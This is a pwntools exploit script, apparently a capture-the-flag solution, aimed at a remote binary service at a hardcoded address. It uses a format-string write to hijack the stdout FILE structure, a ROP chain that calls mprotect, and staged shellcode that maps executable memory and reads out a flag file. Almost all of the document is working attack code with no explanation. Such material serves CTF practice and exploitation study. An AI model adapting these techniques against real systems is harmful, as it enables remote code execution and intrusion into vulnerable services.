from pwn import *
from libformatstr import *

#p = process('./pwn')
p = remote('183.60.136.230',11623)
#p = remote('183.60.136.226',85)
#p = remote('127.0.0.1',9999)
#context.log_level = 'debug'
context.arch = 'amd64'

stdout = 0x6ED320
f = FormatStr(isx64=1,autosort=False)
f[stdout+0xa0]=stdout
f[stdout+0x98]=stdout+0x30
f[stdout+0x50]=0x400BCE # input function
f.dword(stdout+0xd8,0x4ace40-0x38) # _IO_wfile_sync

raw_input('enter1')
p.sendline(f.payload(8))

with p.waitfor('Receiving all data') as h:
    with p.local(3):
        try:
            while True:
                if not p.recv():
                    break
        except EOFError:
            pass

payload = p64(0x40b74a) #pop rdi ; pop rbp ; ret
payload += p64(stdout&0xFFFFF000) #rdi
payload += p64(0x44c469)
payload += p64(0x40b748) #pop rsi ; pop r15 ; pop rbp ; ret
payload += p64(0x2000) #rsi
payload += p64(1)
payload += p64(0x4c3ad8) #call
payload += p64(0x44c476) #pop rdx ; ret
payload += p64(7) #rdx
payload += p64(0x449B30) #mprotect
payload += p64(stdout+0x88+0x20)
payload += p64(stdout)
payload += p64(stdout)
payload += p64(stdout)
payload += p64(stdout)
data = asm(
    '''
    xor edi,edi
    mov esi,0x1000
    mov r8d,0xFFFFFFFF
    mov edx,7
    xor r9d,r9d
    mov r10d,0x22
    mov eax,9
    syscall
    jmp rax
    '''
)
#payload += data
payload += asm(shellcraft.linux.read(0,stdout+0xe0,0x100))
payload += asm(
'''
mov bx,0xd400
jmp rbx
'''
)

#0x00000000004c3ad8 : xchg eax, edi ; xchg eax, esp ; ret
#0x000000000040b74a : pop rdi ; pop rbp ; ret
#0x000000000040b748 : pop rsi ; pop r15 ; pop rbp ; ret
#0x000000000044c476 : pop rdx ; ret


raw_input('enter2')
p.sendline(payload)

payload2 = asm(
'''
xor rdi,rdi
mov rdi,0x6ed000
xor rsi,rsi
mov esi,0x2000
xor rdx,rdx
mov dx,7
xor rax,rax
mov eax,10
syscall

xor rdi,rdi
mov rsi,0x6ed000
mov rdx,0x1000
mov rax,rdi
syscall
jmp rsi
'''
)
raw_input('enter2')
p.sendline(payload2)

payload3 = asm(shellcraft.linux.open("./flag"))
payload3 += asm(shellcraft.linux.read(5,stdout+0xe0,0x30))
payload3 += asm(shellcraft.linux.write(1,stdout+0xe0,0x30))
raw_input('enter2')
p.sendline(payload3)
print len(payload3)

p.interactive()
